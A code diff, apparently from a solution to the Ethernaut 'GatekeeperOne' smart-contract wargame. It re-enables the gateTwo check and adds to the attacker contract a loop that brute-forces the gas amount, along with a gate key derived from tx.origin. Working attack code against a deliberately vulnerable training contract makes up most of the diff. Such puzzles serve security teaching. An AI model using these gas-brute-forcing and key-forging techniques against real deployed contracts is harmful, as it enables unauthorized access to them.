@@ -21,7 +21,7 @@ contract GatekeeperOne {
         _;
     }
 
-    function enter(bytes8 _gateKey) public gateOne gateThree(_gateKey) returns (bool) {
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
         entrant = tx.origin;
         return true;
     }
@@ -37,16 +37,12 @@ contract GatekeeperOneAttack {
     function attack() public {
         bytes8 key = bytes8(uint64(uint16(uint160(tx.origin))) | uint64(1) << 32);
 
-        // // Find the exact gas limit that will pass the gateTwo check
-        // for (uint256 i = 0; i < 8191; i++) {
-        //     (bool success, ) = address(gatekeeperOne).call{gas: 81910 + i}(abi.encodeWithSignature("enter(bytes8)", key));
-        //     if (success) {
-        //         break;
-        //     }
-        // }
-
-        (bool success, ) = address(gatekeeperOne).call(abi.encodeWithSignature("enter(bytes8)", key));
-        require(success);    
-       
+        // Find the exact gas limit that will pass the gateTwo check
+        for (uint256 i = 0; i < 8191; i++) {
+            (bool success, ) = address(gatekeeperOne).call{gas: 81910 + i}(abi.encodeWithSignature("enter(bytes8)", key));
+            if (success) {
+                break;
+            }
+        }   
     }
-}
+}       
